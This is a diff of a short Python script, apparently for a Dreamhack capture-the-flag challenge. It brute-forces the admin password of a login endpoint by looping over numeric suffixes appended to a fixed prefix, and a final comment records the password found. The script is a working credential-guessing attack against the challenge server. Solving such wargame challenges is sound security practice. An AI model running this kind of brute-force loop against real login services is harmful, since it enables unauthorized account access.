@@ -1,18 +1,36 @@
+################## example code ##################
+
+# import requests
+
+# data = {
+#     "id" : "guest0manager01",
+#     "password" : "12",
+# }
+
+# r = requests.post('http://host3.dreamhack.games:18382/user/account', data=data)
+
+# if "success" in r.text:
+# 	print("Find password")
+
+
+
+################## start real code #################
+
 import requests
-from http.cookies import SimpleCookie
 
-url = 'http://host3.dreamhack.games:22327/user/account'
+for i in range(1307000, 1309357):
+	data = {
+		"id" : "admin",
+		"password" : "shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe2" + str(i),
+	}
 
-for i in range(0, 86400000):
+	r = requests.post('http://host3.dreamhack.games:10582/user/account', data=data)
 
-	data = {'guest' : 'guest'}
-	r = requests.post(url, data=data)
-	print(r.cookies)
-	r = requests.get("http://host3.dreamhack.games:22327/description.jpg")
-	print(r.headers)
-	print(r.cookies)
+	if "success" in r.text:
+		print(data)
+		print("Find password")
+		break
 
-	# print(r.text)
-	# if 'fail' not in r.text:
-	# 	print(f'admin Password : {i}')
-	# 	break
+	print(i)
+
+# shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe21307354
